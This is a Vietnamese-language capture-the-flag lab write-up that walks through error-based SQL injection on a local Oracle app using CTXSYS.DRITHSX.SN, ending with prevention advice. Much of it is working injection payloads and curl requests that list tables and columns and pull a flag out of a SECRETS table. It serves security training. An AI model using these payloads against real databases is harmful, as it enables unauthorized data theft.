# SQLi-015: Oracle CTXSYS.DRITHSX.SN Error-based - Complete Writeup

## 📋 Tóm Tắt

Bài lab này yêu cầu khai thác SQL Injection trên Oracle Database sử dụng kỹ thuật **Error-based** với hàm `CTXSYS.DRITHSX.SN` để trích xuất dữ liệu từ bảng `secrets`.

**Độ khó:** Medium-Advanced  
**Kỹ thuật:** Oracle Error-based SQL Injection  
**Mục tiêu:** Trích xuất flag từ bảng `secrets`

---

## 🔍 Bước 1: Reconnaissance & Detection

### 1.1 Khám phá ứng dụng

Truy cập URL: `http://localhost:5015/report?id=1`

```http
GET /report?id=1 HTTP/1.1
Host: localhost:5015
```

**Response:** Hiển thị báo cáo Q1 với nội dung bình thường.

### 1.2 Phát hiện SQL Injection

Thử các payload phát hiện cơ bản:

```bash
# Test 1: Single quote
curl "http://localhost:5015/report?id=1'"
# ❌ Lỗi: ORA-01756: quoted string not properly terminated

# Test 2: Comment
curl "http://localhost:5015/report?id=1--"
# ✅ Hoạt động bình thường

# Test 3: Boolean logic
curl "http://localhost:5015/report?id=1 AND 1=1--"
# ✅ Hiển thị báo cáo Q1

curl "http://localhost:5015/report?id=1 AND 1=2--"
# ❌ Không có kết quả
```

**Kết luận:** Ứng dụng có lỗ hổng SQL Injection!

### 1.3 Xác định Database Management System

Từ error message `ORA-01756`, ta biết đây là **Oracle Database**.

```bash
# Confirm bằng Oracle-specific syntax
curl "http://localhost:5015/report?id=1 AND 1=1 FROM dual--"
# ✅ Hoạt động (dual là bảng đặc biệt của Oracle)
```

---

## 🎯 Bước 2: Tìm Error-based Technique

### 2.1 Vấn đề với error thông thường

Thử truy vấn subquery:

```sql
1 AND 1=(SELECT user FROM dual)--
```

**Error:** `ORA-01722: invalid number`

**Vấn đề:** Oracle chỉ báo lỗi kiểu dữ liệu, **không hiển thị nội dung** của subquery trong error message.

### 2.2 Tìm hàm Error-based phù hợp

Oracle có một số hàm có thể khai thác để leak data qua error messages:

1. **XMLType** - Có sẵn trên mọi Oracle version
2. **CTXSYS.DRITHSX.SN** - Yêu cầu Oracle Text component
3. **UTL_INADDR.GET_HOST_NAME** - Yêu cầu quyền đặc biệt

Trong lab này, ta sẽ dùng **CTXSYS.DRITHSX.SN** vì nó cho output rõ ràng nhất.

---

## 💡 Bước 3: CTXSYS.DRITHSX.SN - Vũ khí Error-based

### 3.1 CTXSYS.DRITHSX.SN là gì?

**Giải thích kỹ thuật:**

```sql
CTXSYS.DRITHSX.SN(index_id, text_value)
```

1. **Mục đích ban đầu:** Hàm này được Oracle Text sử dụng để tạo sequence numbers cho text indexing
2. **Tham số:**
   - `index_id`: ID của text index (có thể là số bất kỳ)
   - `text_value`: Text cần index

**Điểm khai thác:**

Khi ta truyền subquery vào tham số `text_value`:

```sql
CTXSYS.DRITHSX.SN(1, (SELECT user FROM dual))
```

Oracle sẽ:

1. Thực thi subquery → Kết quả: `'APP_USER'`
2. Cố gắng tìm thesaurus với tên `'APP_USER'`
3. **Thất bại** vì thesaurus không tồn tại
4. Exception message **chứa giá trị gốc**: `"thesaurus APP_USER does not exist"`

**Error message điển hình:**

```
ORA-20000: Oracle Text error:
DRG-11701: thesaurus APP_USER does not exist
```

→ Data bị **leak qua error message**! 🎯

### 3.2 Kiểm tra CTXSYS availability

Test xem Oracle Text có sẵn không:

```bash
curl "http://localhost:5015/report?id=1 AND 1=CTXSYS.DRITHSX.SN(1,'test')--"
```

**Nếu thấy error chứa "thesaurus test does not exist"** → ✅ CTXSYS khả dụng!  
**Nếu thấy "ORA-00904: invalid identifier"** → ❌ Oracle Text chưa cài đặt

---

## 🚀 Bước 4: Enumeration - Khám phá Database

### 4.1 Lấy thông tin user hiện tại

**Payload:**

```sql
1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--
```

**Request:**

```http
GET /report?id=1+AND+1=CTXSYS.DRITHSX.SN(1,(SELECT+user+FROM+dual))-- HTTP/1.1
```

**Response:**

```
ORA-20000: Oracle Text error:
DRG-11701: thesaurus APP_USER does not exist
```

→ Current user: `APP_USER` ✅

### 4.2 Liệt kê tất cả các bảng (tables)

**Vấn đề:** Query thông thường `SELECT table_name FROM user_tables` trả về **nhiều dòng**.

**Giải pháp:** Dùng `LISTAGG` để **concatenate tất cả kết quả** thành 1 string!

**Payload:**

```sql
1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) FROM user_tables))--
```

**Request:**

```http
GET /report?id=1+AND+1=CTXSYS.DRITHSX.SN(1,(SELECT+LISTAGG(table_name,+',')+WITHIN+GROUP+(ORDER+BY+table_name)+FROM+user_tables))-- HTTP/1.1
```

**Response:**

```
ORA-20000: Oracle Text error:
DRG-11701: thesaurus REPORTS,SECRETS does not exist
```

→ Phát hiện 2 bảng: `REPORTS`, `SECRETS` ✅

**Giải thích LISTAGG:**

```sql
LISTAGG(column_name, delimiter) WITHIN GROUP (ORDER BY sort_column)
```

- **column_name**: Cột cần concatenate
- **delimiter**: Ký tự ngăn cách (`,`)
- **WITHIN GROUP**: Nhóm tất cả rows
- **ORDER BY**: Sắp xếp trước khi concat

### 4.3 Liệt kê các cột của bảng SECRETS

**Payload:**

```sql
1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT LISTAGG(column_name, ',') WITHIN GROUP (ORDER BY column_name) FROM all_tab_columns WHERE table_name='SECRETS'))--
```

**Request:**

```http
GET /report?id=1+AND+1=CTXSYS.DRITHSX.SN(1,(SELECT+LISTAGG(column_name,+',')+WITHIN+GROUP+(ORDER+BY+column_name)+FROM+all_tab_columns+WHERE+table_name='SECRETS'))-- HTTP/1.1
```

**Response:**

```
ORA-20000: Oracle Text error:
DRG-11701: thesaurus ID,NAME,VALUE does not exist
```

→ Bảng SECRETS có 3 cột: `ID`, `NAME`, `VALUE` ✅

**Cấu trúc bảng SECRETS:**

```
SECRETS
├── ID      (NUMBER)
├── NAME    (VARCHAR2)
└── VALUE   (VARCHAR2) ← Flag ở đây!
```

---

## 🏆 Bước 5: Exploitation - Lấy Flag

### 5.1 Trích xuất FLAG từ cột VALUE

**Payload:**

```sql
1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT VALUE FROM SECRETS))--
```

**Request:**

```http
GET /report?id=1+AND+1=CTXSYS.DRITHSX.SN(1,(SELECT+VALUE+FROM+SECRETS))-- HTTP/1.1
```

**Response:**

```
ORA-20000: Oracle Text error:
DRG-11701: thesaurus FLAG{ctxsys_dr1thsx_0r4cl3} does not exist
```

🎉 **FLAG FOUND:** `FLAG{ctxsys_dr1thsx_0r4cl3}`

---

## 📝 Summary of Exploitation Chain

```
1. Detect SQLi          → ' AND 1=1-- works
2. Identify Oracle      → ORA-xxxxx errors
3. Find error-based     → CTXSYS.DRITHSX.SN available
4. Enumerate user       → APP_USER
5. List tables          → REPORTS, SECRETS (using LISTAGG)
6. List columns         → ID, NAME, VALUE (using LISTAGG)
7. Extract flag         → FLAG{ctxsys_dr1thsx_0r4cl3}
```

**Complete payload sequence:**

```bash
# Step 1: Enumerate current user
curl "http://localhost:5015/report?id=1+AND+1=CTXSYS.DRITHSX.SN(1,(SELECT+user+FROM+dual))--"
# Expected: thesaurus APP_USER does not exist

# Step 2: List all tables
curl "http://localhost:5015/report?id=1+AND+1=CTXSYS.DRITHSX.SN(1,(SELECT+LISTAGG(table_name,',')+WITHIN+GROUP+(ORDER+BY+table_name)+FROM+user_tables))--"
# Expected: thesaurus REPORTS,SECRETS does not exist

# Step 3: List columns in SECRETS table
curl "http://localhost:5015/report?id=1+AND+1=CTXSYS.DRITHSX.SN(1,(SELECT+LISTAGG(column_name,',')+WITHIN+GROUP+(ORDER+BY+column_name)+FROM+all_tab_columns+WHERE+table_name='SECRETS'))--"
# Expected: thesaurus ID,NAME,VALUE does not exist

# Step 4: Extract flag
curl "http://localhost:5015/report?id=1+AND+1=CTXSYS.DRITHSX.SN(1,(SELECT+VALUE+FROM+SECRETS))--"
# Expected: thesaurus FLAG{ctxsys_dr1thsx_0r4cl3} does not exist
```

**Hoặc trong browser:**

```
http://localhost:5015/report?id=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--
http://localhost:5015/report?id=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) FROM user_tables))--
http://localhost:5015/report?id=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT LISTAGG(column_name, ',') WITHIN GROUP (ORDER BY column_name) FROM all_tab_columns WHERE table_name='SECRETS'))--
http://localhost:5015/report?id=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT VALUE FROM SECRETS))--
```

**💡 Lưu ý:** Để automation, xem [exploit.py](exploit.py) script.

---

## 🎓 Bài Học Quan Trọng

### 1. Kỹ thuật LISTAGG trong SQL Injection

**Vấn đề:** Subquery trả về nhiều dòng → `ORA-01427: single-row subquery returns more than one row`

**Giải pháp:** Dùng `LISTAGG` để concatenate tất cả rows thành 1 string:

```sql
LISTAGG(column_name, delimiter) WITHIN GROUP (ORDER BY sort_column)
```

**Ví dụ thực tế:**

```sql
-- ❌ Lỗi: Trả về nhiều dòng
SELECT table_name FROM user_tables

-- ✅ Đúng: Concat thành 1 dòng
SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) FROM user_tables
-- Output: "REPORTS,SECRETS"
```

**Use cases:**

- Liệt kê tables: `LISTAGG(table_name, ',')`
- Liệt kê columns: `LISTAGG(column_name, ',')`
- Liệt kê users: `LISTAGG(username, ',')`

### 2. CTXSYS.DRITHSX.SN vs Other Error-based Methods

| Method                  | Availability           | Output Quality      | Privileges Needed |
| ----------------------- | ---------------------- | ------------------- | ----------------- |
| **CTXSYS.DRITHSX.SN**   | Oracle Text required   | ⭐⭐⭐⭐⭐ Tốt nhất | None              |
| **XMLType**             | Always available       | ⭐⭐⭐⭐ Tốt        | None              |
| **UTL_INADDR**          | Usually available      | ⭐⭐⭐ Trung bình   | EXECUTE privilege |
| **DBMS_XDB_VERSION**    | XDB component required | ⭐⭐⭐ Trung bình   | None              |
| **Custom error_leak()** | Requires setup         | ⭐⭐⭐⭐⭐ Tốt nhất | CREATE FUNCTION   |

**Khuyến nghị:**

1. **Thử CTXSYS.DRITHSX.SN trước** (output tốt nhất)
2. Nếu không có Oracle Text → dùng XMLType
3. Nếu cả hai đều không hoạt động → custom function

### 3. Oracle-specific Techniques

**Oracle có nhiều đặc điểm riêng:**

- Bảng `dual` - dummy table cho queries
- `ROWNUM` thay vì `LIMIT`
- `||` để concat strings
- `CHR()` thay vì `CHAR()`
- Comment với `--` (phải có space sau)

**Ví dụ so sánh:**

```sql
-- MySQL
SELECT * FROM users LIMIT 1 OFFSET 0;

-- Oracle
SELECT * FROM users WHERE ROWNUM = 1;
```

### 4. Real-world Considerations

**Trong thực tế, khi test SQL Injection trên Oracle:**

1. **Check error messages carefully** - Oracle errors rất chi tiết
2. **Test CTXSYS availability** trước khi khai thác
3. **Use LISTAGG** để avoid multi-row subquery errors
4. **Encode payloads properly** trong URLs (spaces → `+` hoặc `%20`)
5. **Watch for WAF/IDS** - CTXSYS có thể bị detect

---

## 🛡️ Cách Phòng Chống

### 1. Sử dụng Prepared Statements

**❌ Vulnerable Code:**

```python
# Bad - String concatenation
query = f"SELECT * FROM reports WHERE id = {user_input}"
cur.execute(query)
```

**✅ Secure Code:**

```python
# Good - Parameterized query
query = "SELECT * FROM reports WHERE id = :id"
cur.execute(query, {"id": user_input})
```

### 2. Input Validation

```python
# Validate that ID is numeric
if not user_input.isdigit():
    return "Invalid input", 400
```

### 3. Least Privilege

```sql
-- App user should NOT have access to SECRETS table
REVOKE SELECT ON secrets FROM app_user;

-- Use stored procedures instead
CREATE PROCEDURE get_report(p_id NUMBER) AS
BEGIN
    SELECT * FROM reports WHERE id = p_id;
END;
```

### 4. Disable Error Messages in Production

```python
# Don't show detailed Oracle errors to users
try:
    cur.execute(query)
except Exception as e:
    logger.error(f"Database error: {e}")
    return "An error occurred", 500  # Generic message
```

### 5. Revoke Unnecessary Privileges

```sql
-- Prevent CTXSYS exploitation
REVOKE EXECUTE ON CTXSYS.DRITHSX FROM PUBLIC;

-- Revoke other dangerous packages
REVOKE EXECUTE ON UTL_INADDR FROM PUBLIC;
REVOKE EXECUTE ON DBMS_XDB_VERSION FROM PUBLIC;
```

---

## 📚 References

- [Oracle SQL Injection Cheat Sheet - PentestMonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
- [Oracle Text Documentation](https://docs.oracle.com/en/database/oracle/oracle-database/19/ccref/)
- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings - Oracle SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Oracle%20Injection.md)
- [Oracle LISTAGG Function](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/LISTAGG.html)

---

## ✅ Flag

```
FLAG{ctxsys_dr1thsx_0r4cl3}
```

**Ý nghĩa flag:**

- `ctxsys` → CTXSYS schema/package
- `dr1thsx` → DRITHSX function (viết leet: DRiTHSX → DR1THSX)
- `0r4cl3` → Oracle (viết leet: Oracle → 0r4cl3)

---

**🎯 Completed:** SQLi-015 - Oracle CTXSYS.DRITHSX.SN Error-based Exploitation
